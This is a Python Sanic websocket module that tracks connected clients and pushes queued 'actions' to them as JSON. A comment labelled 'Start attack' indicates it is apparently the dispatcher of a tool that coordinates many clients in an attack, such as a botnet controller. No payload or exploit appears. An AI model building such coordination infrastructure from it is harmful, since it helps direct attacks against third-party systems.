from typing import List, Union
import logging
import json
import asyncio
from asyncio import sleep

from websockets.connection import State
from sanic.server.websockets.impl import WebsocketImplProtocol

from models import Client
from services.action_services import get_action
from lib.utils import get_app


logger = logging.getLogger(__package__)


async def get_clients() -> List[Client]:
    app = get_app()
    return app.ctx.clients


async def purge_clients():
    app = get_app()
    app.ctx.clients.clear()


async def add_client(ws: WebsocketImplProtocol):
    client = Client(ws=ws)
    clients = await get_clients()
    clients.append(client)
    return client


async def remove_client(client: Client):
    app = get_app()
    app.ctx.clients.remove(client)


async def try_wait_for_action(ws: WebsocketImplProtocol):
    """Enters infinite loop until action appears or client disconnects"""
    while True:
        action = await get_action()
        if action is not None:
            return action

        await sleep(0.1)


async def dispatch_client(client: Client):
    ws = client.ws

    while True:
        # Wait for action
        action = await try_wait_for_action(ws)

        # Start attack
        await ws.send(json.dumps({
            'action': action.dict()
        }))

        logger.info(f"Sending action '{action.command.title}' to '{ws.io_proto.conn_info.peername}'")

        while await get_action() is not None:
            await asyncio.sleep(0.1)
            if ws.connection.state == State.CLOSED:
                break


